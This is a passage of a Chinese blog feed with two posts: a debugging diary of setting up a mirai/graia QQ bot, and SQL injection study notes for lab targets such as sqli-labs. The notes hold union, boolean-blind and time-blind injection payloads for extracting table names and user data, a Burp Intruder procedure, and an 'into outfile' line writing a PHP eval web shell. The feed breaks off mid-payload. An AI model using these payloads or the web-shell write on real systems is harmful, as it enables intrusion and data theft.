    <content type="html"><![CDATA[<p>一直想搭建一个bot实现一些功能，该bot基于mirai机器人框架和graia搭建，参考sagiri-bot功能实现。自己随便写写，这篇文章主要记录一下报错信息和心路历程。</p><a id="more"></a><h2 id="基本搭建"><a href="#基本搭建" class="headerlink" title="基本搭建"></a>基本搭建</h2><p>首先找到了 sagiri-bot框架</p><p>服务器pip换源  pip3 install -r requirements.txt</p><p>创建数据库文件同名数据库(这边之前自己没操作服务器，之间修改配置文件把mysql登录跳过了)</p><p>source 数据库文件的绝对路径 执行数据库文件</p><div class="note bug red">mysql报错:ERROR 1273 (HY000): Unknown collation: 'utf8mb4_0900_ai_ci'</div><p>版本原因：生成转储文件的数据库版本为8.0,要导入sql文件的数据库版本为5.6,因为是高版本导入到低版本，引起1273错误</p><p>解决方法：<br> 打开sql文件，将文件中的所有<br> <code>utf8mb4_0900_ai_ci</code>替换为<code>utf8_general_ci</code><br> <code>utf8mb4</code>替换为<code>utf8</code><br> 保存后再次运行sql文件，运行成功</p><hr><p>以上做的都没什么用，事实上sagiri-bot不能用，魔改了源码采用部分功能重写了</p><h3 id="mirai部分"><a href="#mirai部分" class="headerlink" title="mirai部分"></a>mirai部分</h3><p>基于mirai框架，需要下mirai-console和配置mirai-api-http</p><p>启动mirai-console需要装自启动mirai-console-loader</p><div class="note idea green"><p><strong>优化</strong></p><p>这边github太慢了，直接导入gitee仓库</p></div><p>给服务器装一下Java环境</p><div class="note bug red">启动console报错: java.lang.UnsupportedClassVersionError</div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.UnsupportedClassVersionError: org&#x2F;zjh&#x2F;openlayersdemo&#x2F;OpenlayersdemoApplication has been compiled by a more recent version of the Java Runtime (class file version 55.0), this version of the Java Runtime only recognizes class file versions up to 52.0</span><br></pre></td></tr></table></figure><p>这边装的java8..  需要重装java11</p><div class="note bug red">启动console报错: java.lang.NoSuchMethodError</div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.NoSuchMethodError: net.mamoe.mirai.utils.MiraiLogger$Companion.setDefaultLoggerCreator(Lkotlin/jvm/functions/Function1;)V</span><br></pre></td></tr></table></figure><p>解决:.\mcl —update-package net.mamoe:mirai-core-all —channel nightly</p><p>重新运行mcl 启动mirai-console<br>将mirai-api-http的jar文件拖入plugins</p><p>配置生成的setting.yml 文件</p><p>authkey 1234567890  </p><p>重新启动console</p><p>配置sagiri-bot个人信息</p><div class="note bug red">java报错: JCE cannot authenticate the provider BC</div><p>报错原因：在使用oracle的JDK时，JAR包必须签署特殊的证书才能使用。</p><p>使用openJDK或者非oracle的JDK，这样就可以绕开证书的限制。</p><p>所以重装了java环境，卸载了原有java11环境，使用yum安装了openjdk,将/etc/profile配置文件中的环境变量更改为openjdk安装目录/usr/lib/jvm/xxx，source使之生效</p><p>虽然报错解决了，但对登录不上去这个问题没什么改变…</p><div class="note bug red">console登录报错</div><p>在mirai-console登录qq报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2021-01-01 16:26:05 E&#x2F;main: Failed to init MiraiConsole.</span><br><span class="line"></span><br><span class="line">net.mamoe.mirai.network.WrongPasswordException: Error(title&#x3D;温馨提示, message&#x3D;当前版本过低，请先升级到手机QQ最新版本。, errorInfo&#x3D;)</span><br></pre></td></tr></table></figure><p>最开始报错是不支持滑动验证，根据文档提示修改协议为PAD后</p><p>输入验证码登录，若账号密码验证码不正确则报错网络环境问题；若都正确报错以上信息…问题772</p><p>已解决，更改协议为WATCH后，验证登录即可</p><p>至此mirai部分配置完成，启动需要graia</p><h3 id="graia部分"><a href="#graia部分" class="headerlink" title="graia部分"></a>graia部分</h3><div class="note bug red">启动bot报错: TypeError('Expected maxsize to be an integer or None')</div><p>python3 sagiri_bot.py报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File <span class="string">"/usr/lib64/python3.6/functools.py"</span>, line <span class="number">477</span>, <span class="keyword">in</span> lru_cache     <span class="keyword">raise</span> TypeError(<span class="string">'Expected maxsize to be an integer or None'</span>) TypeError: Expected maxsize to be an integer <span class="keyword">or</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><p> 装了SDK</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install graia-application-mirai</span><br><span class="line">pip install graia-broadcast --upgrade</span><br></pre></td></tr></table></figure><p>发现不仅是import graia.broadcast产生的报错,后边调库的时候还有很多别的报错，经过很久很久的搜索，终于在graia project的issue下面找到了原因所在</p><p>由于pip使用阿里源的问题，直接下载了graia-application-mirai 0.0.6的版本 会出现很多报错</p><p><code>$ pip install -i https://pypi.python.org/simple graia-application-mirai==0.1.0</code></p><p>更改为0.1.0版本不再报错</p><div class="note bug red">启动bot报错: SyntaxError: future feature annotations is not defined </div><p>这次又有了船新报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line">    ^</span><br><span class="line">SyntaxError: future feature annotations <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure><p>从<code>Python 3.7</code>才可以开始导入<code>__future__``annotations</code></p><p>服务器centos自带3.6 重装3.7….. 之前给ubuntu做过升级</p><p>装好后更改软连接，使pip3与python3指向3.7</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;python3&#x2F;bin&#x2F;python3 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;python3</span><br><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;python3&#x2F;bin&#x2F;pip3 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;pip3</span><br></pre></td></tr></table></figure><p>重装第三方库</p><div class="note bug red">启动bot报错: AttributeError: 'ApplicationLaunched' object has no attribute 'app'</div><p>好家伙，还有什么报错是我没遇到的…</p><p>报错原因:问题出在pydantic包，graia.broadcast.entities.event.EventMeta类继承自pydantic中的ModelMetaclass类，在pydantic版本是1.7.1的情况下该类貌似添加了一个空的<strong>slots</strong>属性，导致子类都无法进行self的赋值。把pydantic包回退到1.6.1版本问题解决。</p><p><code>pip3 install pydantic-1.6.1</code></p><p>重新运行bot.py</p><p>至此，机器人实现了第一次会话  芜湖~</p><p><img src="/2021/01/10/bot/image-20210102175545239.png" alt="image-20210102175545239"></p><p><img src="/2021/01/10/bot/image-20210102175556793.png" alt="image-20210102175556793"></p><div class="note idea green"><p><strong>优化</strong></p><p>    编写代码再用winscp上传到服务器太过费劲(关键是老断，vim也比较麻烦。装了vscode的插件sftp,服务器建立相同文件名文件夹,右键直接upload即可。芜湖~    </p></div><div class="note bug red">scheduler与application不兼容报错</div><p>运行sagiri_bot.py  报错无graia.scheduler模块</p><p>装后broadcast版本问题发生冲突…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">graia-application-mirai <span class="number">0.1</span><span class="number">.0</span> has requirement graia-broadcast&lt;<span class="number">0.0</span><span class="number">.6</span>,&gt;=<span class="number">0.0</span><span class="number">.5</span>, but yo<span class="string">u'll have graia-broadcast 0.5.3 which is incompatible.</span></span><br></pre></td></tr></table></figure><p>graia-application-mirai 0.1.0 需要 broadcast<0.0.6,>=0.0.5</0.0.6,></p><p>但graia-scheduler需要broadcast<0.6.0,>=0.5.3</0.6.0,></p><p>安装scheduler后broadcast版本为0.5.3</p><p>解决:搜索后发现文档更新</p><p><img src="/2021/01/10/bot/image-20210103225327439.png" alt="image-20210103225327439"></p><p>更新到graia-application-mirai==0.1.1后，broadcast版本可以兼容</p><p>但是佩奇不能回复了….</p><blockquote><p>现在服务器软连接都快乱了..记录一下</p><p>cd usr/bin</p><p>ls -al *python*</p><p>python3-&gt;python3.7.0   pip3-&gt;python3.7.0</p><p>python3.6-&gt;python3.6.8  pip3.6-&gt; python3.6.8</p></blockquote><p>最终解决: 看github上作者commit的历史版本找了个合适的graia-application-mirai 0.11.0 ,可以兼容并运行(突然发现graia-application-mirai 都更到0.14.0了</p><p>耶斯莫拉，今天佩奇被冻结了呜呜呜呜，又是拼命解冻的一天</p><h2 id="bot编写"><a href="#bot编写" class="headerlink" title="bot编写"></a>bot编写</h2><p>async与await</p><p>def name(x:’str’)-&gt;’int’:</p><p>服务器服务后台悬挂(关闭终端不影响)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nohup python xxx.py &amp;  </span><br><span class="line">ps -ef|grep xxx</span><br><span class="line">kill -9 pid</span><br></pre></td></tr></table></figure><h3 id="钉钉接口"><a href="#钉钉接口" class="headerlink" title="钉钉接口"></a>钉钉接口</h3><p>可以实现从后台导出日报数据，但必须是企业管理员权限</p><p>分析河北师大的组织架构与我创建的APItest映射</p><p>河北师范大学(APItest)</p><p>2019级群(子部门)</p><p>辅导员(子部门群主test)</p><p>班长(子部门管理员)</p><p>经测试，所有人都可创建表，并对自己创建的表有管理权限</p><p>子部门群主和管理员都没有权限登录后台(估计要河北师范大学的管理员</p><p>所以不考虑从后台导出表格，可以考虑下ocr…哎</p><h3 id="疫情模块"><a href="#疫情模块" class="headerlink" title="疫情模块"></a>疫情模块</h3><p>调用新浪接口</p><p><a href="https://interface.sina.cn/news/wap/fymap2020_data.d.json" target="_blank" rel="noopener">https://interface.sina.cn/news/wap/fymap2020_data.d.json</a></p><p>返回数据后decode 此时为json格式的字符串</p><p>json.loads() 将<code>json</code>格式数据解码为<code>python</code>对象(即字典)，再对数据进行处理</p><h3 id="六级词汇模块"><a href="#六级词汇模块" class="headerlink" title="六级词汇模块"></a>六级词汇模块</h3><p>六级词汇字典上传到服务器后中文乱码</p><p>开始以为是vim编码的问题，但是py的问题</p><p>读文件r读字符串utf8无法解码，rb以二进制形式读进来后需要再解码进行转换成str 解码用gbk就可以显示了(不知道为啥utf8不行 菜鸡の迷惑</p><p>奥  txt是ANSI编码的，GBK属于ANSI之中的，在ANSI的国际通用集，GBK是专门来解决中文编码的，那没事了TnT</p><h3 id="bilibili推送模块"><a href="#bilibili推送模块" class="headerlink" title="bilibili推送模块"></a>bilibili推送模块</h3><p>三个思路</p><p>× 1.搞了bilibili的json</p><p>哔哩哔哩小程序 最终分享地址为url参数中的内容，需要每日分享获取其url 较难自动实现(后面的随机值应该为哔哩哔哩小程序自动生成)</p><p>手机端不能显示 PC端可以</p><p><img src="/2021/01/10/bot/image-20210117181941668.png" alt="image-20210117181941668"></p><p>这个格式是Bilibili小程序的 url问题解决不了 呜呜呜呜</p><p>× 2.申请自己的小程序 最终直接访问 bilibili.com 涉及开发了 草</p><p>√ 3.找其他小程序的跳转功能 json源码 试了几个跳不了 草</p><p>歪日 终于成了 google永远滴神 找了一个可跳转的小程序 唯二不足就是图片白搞了&amp;BV号得手动输入（待优化）</p><p>然后设成定时了</p><h3 id="论文推送"><a href="#论文推送" class="headerlink" title="论文推送"></a>论文推送</h3><p>知乎的非官方api都用不了了，增加了反爬机制。</p><p>最初使用requests包请求界面，报403..原来是因为没加headers(没有设置headers请求头，被服务器拦截，一般情况下设置user-agent即可。)</p><p>后来使用selenium库 模拟打开浏览器，寻找元素并定位</p><p>一直报错找不到元素，很疑惑  加个sleep就好了 一部分没加载出来</p><p>找到对应标题的超链接 获取元素属性get_attribute()</p><p>定位使用的是find_element_by_link_text</p><p>得到对应文章url  推送即可</p><p>问题是如何部署在centos上，服务器无GUI使用selenium</p><p>参考链接:<a href="https://blog.csdn.net/shilaike2/article/details/102595228" target="_blank" rel="noopener">https://blog.csdn.net/shilaike2/article/details/102595228</a></p><p>安装xvfb  Xvfb是一个实现了X11显示服务协议的显示服务器。 不同于其他显示服务器，Xvfb在内存中执行所有的图形操作，不需要借助任何显示设备</p><p>还需增加几个options</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">chrome_options =webdriver.Options()</span><br><span class="line"></span><br><span class="line">chrome_options.add_argument(<span class="string">'--no-sandbox'</span>) <span class="comment">#让Chrome在root权限运行</span></span><br><span class="line"></span><br><span class="line">chrome_options.add_argument(<span class="string">'--disable-dev-shm-usage'</span>) <span class="comment">#不打开图形界面</span></span><br><span class="line"></span><br><span class="line">chrome_options.add_argument(<span class="string">'--headless'</span>) <span class="comment">#浏览器不提供可视化页面</span></span><br><span class="line"></span><br><span class="line">chrome_options.add_argument(<span class="string">'blink-settings=imagesEnabled=false'</span>) <span class="comment">#不加载图片, 提升速度</span></span><br><span class="line"></span><br><span class="line">chrome_options.add_argument(<span class="string">'--disable-gpu'</span>) <span class="comment">#谷歌文档提到需要加上这个属性来规避bug</span></span><br></pre></td></tr></table></figure><p>又是面向百度编程的一天</p>]]></content>
    
    
    <categories>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入学习</title>
    <link href="/2020/11/30/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2020/11/30/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>sql注入学习笔记，感谢好朋友月夜见提供的学习资料。包含union注入、布尔盲注、时间盲注、报错注入、堆叠注入、二次注入、宽字节注入、UserAgent/Referer/Cookie注入、sqlmap的使用…</p><a id="more"></a><h2 id="14-SQL注入原理"><a href="#14-SQL注入原理" class="headerlink" title="14 SQL注入原理"></a>14 SQL注入原理</h2><h3 id="OWASP-top10"><a href="#OWASP-top10" class="headerlink" title="OWASP top10"></a>OWASP top10</h3><h3 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h3><ul><li><p>sql：结构化查询语言</p></li><li><p>应用系统使用sql管理数据库，采用<strong>拼接</strong> 的方式形成一条完整的数据库语言</p></li><li><p>把sql命令插入到<strong>web表单</strong>或<strong>输入域名页面请求</strong>的查询字符串</p></li></ul><h3 id="数据库基础"><a href="#数据库基础" class="headerlink" title="数据库基础"></a>数据库基础</h3><h4 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h4><h5 id="什么是数据库"><a href="#什么是数据库" class="headerlink" title="什么是数据库"></a>什么是数据库</h5><h6 id="关系型数据库管理系统（RDBMS）"><a href="#关系型数据库管理系统（RDBMS）" class="headerlink" title="关系型数据库管理系统（RDBMS）"></a>关系型数据库管理系统（RDBMS）</h6><p>关系型数据库，是建立在关系模型基础上的数据库，借助于集合代数等数学概念和方法来处理数据库中的数据。</p><p>RDBMS 的特点：</p><ul><li>1.数据以表格的形式出现</li><li>2.每行为各种记录名称</li><li>3.每列为记录名称所对应的数据域</li><li>4.许多的行和列组成一张表单</li><li>5.若干的表单组成database</li></ul><p><img src="/2020/11/30/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200324111143839.png" alt="image-20200324111143839"></p><h5 id="数据库基础-1"><a href="#数据库基础-1" class="headerlink" title="数据库基础"></a>数据库基础</h5><h6 id="常用数据库查询语句"><a href="#常用数据库查询语句" class="headerlink" title="常用数据库查询语句"></a>常用数据库查询语句</h6><ul><li>create datebase   创建数据库<strong>数据库名字不能使用全数字</strong></li><li>drop database </li><li>show databases</li><li>select databses() 当前的数据库名</li></ul><p>使用一个数据库 use 数据库名；</p><p><a href="https://www.runoob.com/mysql" target="_blank" rel="noopener">https://www.runoob.com/mysql</a></p><h6 id="常用数据库内置变量"><a href="#常用数据库内置变量" class="headerlink" title="常用数据库内置变量"></a>常用数据库内置变量</h6><ul><li><p>version() 查询数据库版本</p><p>@@version 效果等同</p></li><li><p>user() 数据库运行的用户</p></li><li><p>datebase() 数据库名</p></li></ul><p>相当于在命令行下执行 select version()</p><h2 id="15、16-mysql注入常见函数"><a href="#15、16-mysql注入常见函数" class="headerlink" title="15、16   mysql注入常见函数"></a>15、16   mysql注入常见函数</h2><p>1.字符串链接函数</p><ul><li>concat 链接多个字符串 </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select concat(name,&#39;|&#39;,email,&#39;|&#39;,passwprd) from users;</span><br><span class="line">#若字符串查询内容中有一个为空，则整体为空</span><br></pre></td></tr></table></figure><ul><li>concat_ws</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select concat_ws(&#39;|&#39;,name.email,password) from users;</span><br><span class="line">#不会整体为空，第一个参数为分隔符，如果第一个参数为空，则整体为空</span><br></pre></td></tr></table></figure><ul><li><p>group_concat</p><p>把字段里的内容一起显示，限制：查询出来的结果的长度默认是1024</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(username) from users;</span><br></pre></td></tr></table></figure><p>​            可以进行联合使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(concat_ws(&#39;|&#39;,username,id)) from users;</span><br></pre></td></tr></table></figure><p>2.字符串截取函数</p><p>所有函数操作数从1开始而不是从0开始，除limit外</p><ul><li>substring</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select substring((select username from users limit 0,1)，1，2)</span><br><span class="line">#substring第一个参数 查询的结果字符串，第二个参数 从什么地方开始截取，第三个参数 长度是多少</span><br><span class="line">#limit 如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目</span><br></pre></td></tr></table></figure><p>substr也可以代替使用</p><ul><li>mid</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select mid(&#39;test123&#39;,2,3)</span><br><span class="line">&gt;est</span><br></pre></td></tr></table></figure><ul><li><p>left</p><p>从左开始截取长度为3，right函数相反</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select left(&#39;test123&#39;,3)</span><br><span class="line">&gt;tes</span><br><span class="line">select right(&#39;test123&#39;,3)</span><br><span class="line">&gt;123</span><br></pre></td></tr></table></figure><ul><li><p>locate</p><p>返回第一个参数字符串在第二个参数中第一次出现的位置</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select locate(‘123test123&#39;,&#39;as123test123&#39;)</span><br><span class="line">&gt;3</span><br></pre></td></tr></table></figure><p>3.返回指定的ASCII字符对应的数值</p><ul><li><p>ascii </p><p>只有一个参数，需要转换的</p><p>ord与ascii用法相同</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select ascii(&#39;a&#39;);</span><br><span class="line">&gt;97</span><br><span class="line">select ascii(substring((select username from users limit 0,1),2,1));</span><br></pre></td></tr></table></figure><p>4.返回指定数字对应的ascii字符</p><ul><li>char</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select char(97);</span><br><span class="line">&gt;a</span><br></pre></td></tr></table></figure><p>5.字符串替换</p><ul><li><p>replace</p><p>把username字段里的zangsan sds替换为了hh</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select replace((select  username from users limit 0,1),&#39;zangsan sds&#39;,&#39;hh&#39;)</span><br></pre></td></tr></table></figure><p>6.计算长度</p><ul><li>length</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select length(&#39;hahshdk&#39;);</span><br><span class="line">&gt;7</span><br></pre></td></tr></table></figure><ul><li><p>count</p><p>记录某个表下有多少记录</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from users;</span><br></pre></td></tr></table></figure><p>7.时间盲注会用到的函数</p><p>sleep、if</p><ul><li><p>sleep</p><p>使输出结果延迟了10s</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users union select 1,2,sleep(10);</span><br></pre></td></tr></table></figure><p>8.读写文件函数</p><p>写文件</p><p>into outfile </p><p>把一句话木马写入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php@eval($_POST[&#39;mm&#39;?])&gt;&quot; into outfile &quot;d:&#x2F;shell.php&quot;</span><br></pre></td></tr></table></figure><p>一般路径是网站的根路径</p><p>into dumpfile(读取二进制文件)</p><p>读文件</p><p>load_file()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#39;d:&#x2F;shell.php&#39;)</span><br></pre></td></tr></table></figure><p>9.注释方法</p><ul><li>#</li><li>/— -</li><li>— +</li><li>/**/</li><li>/<em> ! </em> /</li><li>/<em>!50000 </em>/ mysql5通用，带版本内联注释</li></ul><h2 id="17-18information-schema相关"><a href="#17-18information-schema相关" class="headerlink" title="17 18information_schema相关"></a>17 18information_schema相关</h2><p>information_schema(mysql 5.0以上的版本才存在)</p><p>在MySQL中，把information_schema看作是一个数据库，确切地说是信息数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。</p><p><a href="https://www.cnblogs.com/shengdimaya/p/6920677.html" target="_blank" rel="noopener">https://www.cnblogs.com/shengdimaya/p/6920677.html</a></p><p>SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases结果取于此表</p><p>TABLES表：提供了关于数据库中所有的表的信息。详细描述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname(数据库名)的结果取之此表。</p><p>COLUMNS表：所有数据库所包含的所有表的列名信息以及每个列的信息。是show columns from schemaname.tablename 的结果取之此表。</p><h3 id="information-schema在mysql注入中的运用"><a href="#information-schema在mysql注入中的运用" class="headerlink" title="information_schema在mysql注入中的运用"></a>information_schema在mysql注入中的运用</h3><p>先查询出mysql版本</p><h2 id="19-、20-union注入"><a href="#19-、20-union注入" class="headerlink" title="19 、20 union注入"></a>19 、20 union注入</h2><p>实验环境搭建：dvwa sqli-labs</p><h3 id="基于union的注入"><a href="#基于union的注入" class="headerlink" title="基于union的注入"></a>基于union的注入</h3><p>?后表示通过get方式传递的参数</p><p>order by判断当前查询表里的字段</p><p>?id=1 union select 1,2,3</p><p>?id=0(查询不到，执行后面的查询) union select 1,2,3</p><p>  1,2,3为三个字段用于占位，可以更改为想要查询内容你的对应函数</p><h6 id="获取对应表"><a href="#获取对应表" class="headerlink" title="获取对应表"></a>获取对应表</h6><p>?id=0 union select 1,database(),table_name from information_schema.tables where table_schema=’test’</p><p>>test:users</p><h6 id="查询列"><a href="#查询列" class="headerlink" title="查询列"></a>查询列</h6><p>?id=0 union select 1,database(),column_name from information_schema.columns where table_schema=’test’ and table_name=’users’</p><p>>test:id</p><p>但列名不止id一个字段</p><p>?id=0 union select 1,database(),group_concat(column_name) from information_schema.columns where table_schema=’test’ and table_name=’users’</p><p>查询出所有列名</p><p>如果只能看一个就可通过limit进行查阅</p><p>?id=0 union select 1,database(),column_name from information_schema.columns where table_schema=’test’ and table_name=’users’ limit 1,1</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> tableName <span class="keyword">limit</span> i,n</span><br><span class="line"><span class="comment"># tableName：表名</span></span><br><span class="line"><span class="comment"># i：为查询结果的索引值(默认从0开始)，当i=0时可省略i</span></span><br><span class="line"><span class="comment"># n：为查询结果返回的数量</span></span><br><span class="line"><span class="comment"># i与n之间使用英文逗号","隔开</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="keyword">limit</span> n 等同于 <span class="keyword">limit</span> <span class="number">0</span>,n</span><br></pre></td></tr></table></figure><h6 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h6><p>?id=0 union select 1,database(),username from users limit 0,1 //或使用group_concat()</p><h3 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h3><p>判断是否存在sql注入</p><ul><li><p>通过单引号进行查找 </p><p>？id=114’</p><p>单引号破坏了原来sql语句的语法，并报错。确定114’被采用拼接方式带入了数据库执行</p><p>—+注释掉后面的单引号 +在url中是空格的意思</p></li><li><p>当加减法对页面没有影响时，说明不是数字型的注入</p></li><li><p>通过sleep判断sql注入是否存在</p><p>?id=114 and sleep(10)</p><p>通过f12查询所需时间发现没有影响，说明可能把114后内容舍弃了</p></li></ul><p>确定注入字段数</p><ul><li>通过order by </li><li>?id=114’order by +字段数</li></ul><p>联合查询</p><ul><li><p>通过编码方式绕过关键字过滤</p></li><li><p>查询数据库版本 5.0以下不能使用information_schema</p></li><li><p>查找出当前数据库</p></li><li><p>查找出所有表</p><p>?id=114’ union select 1,2,table_name,4,5,6 from information_schema.tables where table_schema=’interali_project’—+</p><p>可以通过group_concat将查询结果连接在一起</p></li><li><p>获取相关表的字段名</p><p>?id=114’ union select 1,2,column_name,4,5,6 from information_schema columns where table_schema=’interali_project’ and table_name=’usertable’—+</p></li><li><p>获取字段下的数据</p><p>?id=114’ union select 1,2,username,4,5,6 from usertable—+</p></li></ul><h2 id="21-、22-布尔盲注"><a href="#21-、22-布尔盲注" class="headerlink" title="21 、22 布尔盲注"></a>21 、22 布尔盲注</h2><h3 id="手工注入过程"><a href="#手工注入过程" class="headerlink" title="手工注入过程"></a>手工注入过程</h3><p>1.获取数据库名字长度</p><p>?id=1’ and (length(datebase()))—+</p><p>?id=1’ and (length(database()))&gt;5—+</p><p>2.获取数据库名字</p><p>?id=1’ and ascii(substr(database(),1,1))&gt;100—+</p><p>//排序除limit外，都从1开始</p><p>使用burp的intruder模块遍历</p><p>3.获取表的数量</p><p>?id=1’ and (select count(*) from information_schema.tables where table_schema=database())&gt;5—+</p><p>4.获取表名的长度</p><p>?id=1’ and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1//只获取第一个表名)&gt;5—+</p><p>通过limit获取每张表表名的长度</p><p>5.获取表的名字</p><p>?id=1’ and (select ascii(substr(table_name,1,1) from information_schema.tables where table_shcema=database() limit 0,1)&gt;100—+ </p><p>6.获取列名的数量</p><p>?id=1’ and (select count(column_name) from information_schema.columns  where table_schema=databse() and table_name=’emails’)&gt;5—+</p><p>7.获取列名的长度</p><p>?id =1’ and (select length(column_name) from information_schema.columns where table_schema=database() and table_name=’emails’ limit 0,1)&gt;2—+</p><p>8.获取列的名字</p><p>?id=1’ and (select ascii(substr(column_name,1,1)) from information_schema.columns where table_schema=database() and table_name=’emails’ limit 0,1)&gt;100—+</p><p>9.获取表中的数据</p><p>获取数据</p><p>?id=1’ and ascii(substr((select id from emails limit 0,1),1,1))=49—+</p><p>?id=1’ and ascii(substr((select id from emails limit 1,1),1,1))=50—+</p><p>…….</p><h3 id="使用burpsuite"><a href="#使用burpsuite" class="headerlink" title="使用burpsuite"></a>使用burpsuite</h3><p>进行抓包-&gt; Intruder-&gt;Positions(目标)-&gt;Sniper(狙击模式)-&gt;clear 去掉默认加的变量符-&gt;把需要猜测的ascii值加上变量符 $114$ -&gt;设置Payload payload set=1 payload type=Numbers -&gt;选择sequential(顺序)或random,from 0 to 127,step=1-&gt;start</p><p>最好使用等于号，而不是大于号小于号，使结果一目了然，只有一个</p><h2 id="23-时间盲注"><a href="#23-时间盲注" class="headerlink" title="23  时间盲注"></a>23  时间盲注</h2><p>通过时间变化判断sql语句是否被成功地执行</p><h3 id="判断id数据类型成功执行sql语句"><a href="#判断id数据类型成功执行sql语句" class="headerlink" title="判断id数据类型成功执行sql语句"></a>判断id数据类型成功执行sql语句</h3><p>?id=1’ and sleep(10)—+</p><p>加载10s以上  查看方法:f12-&gt;Network 看到整个请求完成的时间</p><p>假设id是数字型 ?id=1 and if(1=1,sleep(5),1)//若1=1，sleep(5);else,返回1</p><p>没有延时，假设是字符型</p><p>?id=1’ and 